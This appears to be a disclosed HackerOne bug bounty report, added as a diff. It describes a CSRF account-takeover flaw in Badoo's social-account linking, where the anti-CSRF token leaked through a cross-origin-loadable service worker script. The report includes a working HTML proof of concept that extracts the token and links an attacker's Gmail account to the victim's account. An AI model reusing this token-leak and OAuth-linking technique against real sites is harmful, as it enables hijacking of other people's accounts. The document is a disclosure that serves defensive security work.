@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/127703
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/zombiehelp54
+ReportedTo:Badoo(badoo)
+BountyAmount:852.0
+Severity:
+State:Closed
+DateOfDisclosure:12.04.2016 19:18:20
+
+Summary:
+
+Hi , I have found a CSRF issue that allows an attacker to link his gmail , facebook ... or any social account to the victim's account and hijack the whole account.
+#Details:
+When a user tries to link a gmail account with his account , after he authorizes badoo to use his gmail account he will be redirected to `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` , the only thing that protects from CSRF is the `rt` parameter which is unique for each user/session . I have noticed that the `rt` parameter is returned on almost all json responses so I tried to find a link that leaks it. After digging for a while , I have found this link https://eu1.badoo.com/worker-scope/chrome-service-worker.js , and I was surprised that it contains the `rt` parameter value!! 
+if you open the link `https://eu1.badoo.com/worker-scope/chrome-service-worker.js ` you'll find a string variable `url_stats` containing the value of the `rt` parameter:
+```javascript
+var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
+```
+So, now I got a javascript file with the `rt` param value and I can use it to link any malicious social media account with it. 
+#Here is a PoC: 
+Here is a live PoC: http://azzazpp.com/badoo.html which will link a dummy gmail account of mine to your badoo account. Go to https://eu1.badoo.com/settings then check your social accounts and you will see a gmail account with the name `Mahmoud Gamal` added to your social accounts.
+
+```
+<html>
+<head>
+<title>Badoo account take over</title>
+<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
+</head>
+<body>
+<script>
+function getCSRFcode(str) {
+    return str.split('=')[2];
+}
+window.onload = function(){
+var csrf_code = getCSRFcode(url_stats);
+csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
+window.location = csrf_url;
+};
+</script>
+```
+After an attacker links his gmail , facebook or any social account to the victim's account , he can use it to login to the victim's account and do any modifications he wants.
+Please tell me if you are having any problems reproducing this.
+Thanks!
